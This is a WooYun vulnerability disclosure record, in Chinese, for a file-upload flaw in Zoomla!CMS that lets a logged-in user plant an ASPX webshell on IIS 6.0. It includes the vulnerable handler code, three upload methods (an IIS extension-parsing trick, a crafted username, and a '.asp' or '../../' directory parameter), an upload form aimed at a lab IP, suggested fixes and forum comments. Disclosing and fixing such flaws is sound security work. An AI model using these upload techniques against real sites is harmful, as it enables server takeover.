{"id": 2346, "wybug_id": "wooyun-2014-060079", "wybug_title": "逐浪CMS一个漏洞的各种拿Shell姿势（系统环境限制）", "wybug_corp": "逐浪CMS", "wybug_author": "Damo", "wybug_date": "2014-05-09 18:55", "wybug_open_date": "2014-08-07 18:56", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["解析漏洞", "文件上传", "解析文件漏洞", "代码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向公众公开  简要描述： 文件目录随意保存影响版本：包含此文件的版本均受影响拿Shell影响版本：包含此文件的版本均受影响 仅是（IIS6.0）依官网最新版本为测试对象 Zoomla!CMS2_x1.5 详细说明：  首先还是问题出现的部分  文件 \n\\User\\UploadHandler.ashx\n看代码-------------\nHttpPostedFile file = context.Request.Files[\"Filedata\"];        if (context.Request[\"content\"] != null || context.Request[\"content\"] != \"0\")        {\t\t              context.Response.ContentType = \"text/plain\";            context.Response.Charset = \"utf-8\";            string PhPath = \"\";            context.Response.Write(context.Server.UrlDecode(context.Request[\"Dir\"]));            string path = HttpContext.Current.Server.MapPath(\"\\\\\" + SiteConfig.SiteOption.UploadDir + \"\\\\\") + uinfo.UserName + \"\\\\\" + context.Server.UrlDecode(context.Request[\"Dir\"]) + \"\\\\\";\t\t\t\t\t\t            PhPath = path;            if (file != null)            {                if (!Directory.Exists(path))                {                    Directory.CreateDirectory(path);                }                string[] str = file.FileName.Split('.');                if (str.Length > 0)                {                   ######### //path += DateTime.Now.ToString(\"yyyyMMddHHmmssfffffff\") + \".\" + str[str.Length - 1];                    path += file.FileName;                    file.SaveAs(path);                }                //throw new Exception(path.Replace(PhPath, \"\\\\UploadFiles\"));                //上传成功后让上传队列的显示自动消失                context.Response.Write(path.Replace(PhPath, \"\").Replace('\\\\', '/'));            }            else            {                context.Response.Write(\"0\");            }        }\n问题出现在 path中 有三个地方存在危险 一个是  uinfo.UserName  一个是  context.Request[\"Dir\"]  还有一个则是  path += file.FileName; file.SaveAs(path);首先第一种方式      则是  则是尼玛直接利用IIS解析漏洞  xxx.aspx;.jpg       敢问官方\n######### //path += DateTime.Now.ToString(\"yyyyMMddHHmmssfffffff\") + \".\" + str[str.Length - 1];\n     这个事干吊用的？图：\n\n那么首先用第二种方式 uinfo.UserName 用户名的方式进行shell\t\t注册-----》\t\t注：这里不能注册.aspx的用户 原因在golbal中 代码片段如下\nif (((base.Application[\"safeDomain\"] != null) && \t\t!string.IsNullOrEmpty(base.Application[\"safeDomain\"].ToString())) && \t\t(base.Request.RawUrl.ToLower().Contains(\".aspx\") ------------这里\t\t&& !ZoomlaSecurityCenter.IsSafeDomain(base.Application[\"safeDomain\"].ToString().ToLower())))\n先登录\t\t本地创建一个.aspx代码片段如下\n<form id=\"form1\" runat=\"server\" method=\"post\" action=\"http://192.168.10.19:9992/User/UploadHandler.ashx?content=aaaaaaaaa&Dir=abc\">\t\t<div>\t\t <asp:FileUpload ID=\"Filedata\" runat=\"server\" /><input id=\"Submit1\" type=\"submit\" value=\"submit\" />\t\t</div>\t\t</form>\n然后上传得到文件 访问地址则为  Domain/UploadFiles/用户名/abc/文件名\t\t  Shell到手 图：\n\n\n\n开启第三种方式 利用目录 \t\t本地创建一个.aspx代码片段如下\n<form id=\"form1\" runat=\"server\" method=\"post\" action=\"http://192.168.10.19:9992/User/UploadHandler.ashx?content=aaaaaaaaa&Dir=abc\">\t\t<div>\t\t <asp:FileUpload ID=\"Filedata\" runat=\"server\" /><input id=\"Submit1\" type=\"submit\" value=\"submit\" />\t\t</div>\t\t</form>\nDir则为目录参数\t\t那么可以简单的构造成\t\thttp://192.168.10.19:9992/User/UploadHandler.ashx?content=aaaaaaaaa&Dir=.asp \t\t上传得到SHell 地址为Domain/UploadFiles/用户名/.asp/文件名图\n\n另外文件可以随意保存  只要将目录更改为http://192.168.10.19:9992/User/UploadHandler.ashx?content=aaaaaaaaa&Dir=../../\t\t即可（保存到根目录）\n\n   漏洞证明：     修复方案：  解决第一种方式---这个 这个明明有为何不用？ \n//path += DateTime.Now.ToString(\"yyyyMMddHHmmssfffffff\") + \".\" + str[str.Length - 1];\n   去掉前两个斜线然后将path += file.FileName;注释掉即可 第二种方式对注册用户名过滤严谨第三种方式 兄台用uploadify 你也不说改改代码  Dir 咱能不直接用uploadify传过来的folder吗    \t\t小弟不才简单方法大牛勿喷   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-05-10 07:59 厂商回复： 交审！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-09 21:26 |    \t\tkider脚本小子 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 系统软件安装及其调试。电脑硬件问题检测...)\t\t \n  涨姿势    \n     2014-05-10 10:08 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  @Damo 你这是多少个文件的集合？    \n     2014-05-10 11:43 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @what_news  放心小弟不会提交你们提交过的东西 对了晓不晓的这款CMS有个地方时可以执行c#代码的地方正在找利用方法  啧啧    \n     2014-05-10 12:04 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  @Damo 还是你牛     \n     2014-05-15 14:23 |    \t\tObeach \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一只经常被骗的小屁孩)\t\t \n  @Damo 脚！！赞一个    \n     2014-08-07 21:05 |    \t\tling \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:35        | 我是屌丝、我为自己代言 。)\t\t \n  1    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}